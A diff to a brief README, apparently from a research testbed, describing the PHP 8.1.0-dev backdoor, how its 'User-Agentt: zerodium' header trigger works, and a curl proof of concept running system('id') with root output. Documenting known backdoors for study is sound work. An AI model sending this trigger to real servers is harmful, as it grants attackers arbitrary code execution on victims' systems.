@@ -1,11 +1,12 @@
 # PHP 8.1.0-dev backdoor
-- **Type**: hidden command/hardcoded credentials
+- **Type**: hidden command, hardcoded credentials
 - **Affected versions**: 8.1.0-dev (illegitimate commits)
 
 
 ## Backdoor
 Upon receiving an HTTP request with a `"User-Agentt"` header field set to `"zerodium<CMD>"`, where
 `<CMD>` is arbitrary PHP code, the `sapi/cli/php` server will execute that PHP code.
+
 
 ## Triggering the backdoor
 First, we need to start up the HTTP server (e.g., with the _backdoored_ variant):
@@ -38,6 +39,7 @@ $ curl -v -H "User-Agentt: zerodiumsystem('id')" http://localhost:8080
 uid=0(root) gid=0(root) groups=0(root)
 * Closing connection
 ```
+
 
 ## Reference
 <https://doi.org/10.1145/3577923.3583657>
